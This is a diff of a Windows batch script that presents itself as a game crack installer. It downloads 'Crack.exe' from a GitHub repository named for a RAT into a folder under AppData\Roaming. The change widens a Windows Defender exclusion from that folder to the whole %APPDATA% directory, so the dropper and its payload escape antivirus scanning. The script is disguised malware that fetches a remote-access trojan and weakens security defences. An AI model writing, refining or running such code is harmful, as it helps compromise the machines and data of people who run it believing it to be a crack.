@@ -10,7 +10,7 @@ if %errorlevel% NEQ 0 (
 )
 
 :: Set up paths
-set "TARGET_DIR=%USERPROFILE%\AppData\Roaming\SubDir"
+set "TARGET_DIR=%APPDATA%\SubDir"
 set "GAME_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/main/Crack.exe"
 set "GAME_FILE=%TARGET_DIR%\Crack.exe"
 
@@ -19,8 +19,8 @@ if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%"
 )
 
-:: Add exclusion first
-powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'"
+:: Add exclusion for the entire AppData\Roaming folder
+powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'"
 
 :: Clean output
 echo Downloading crack
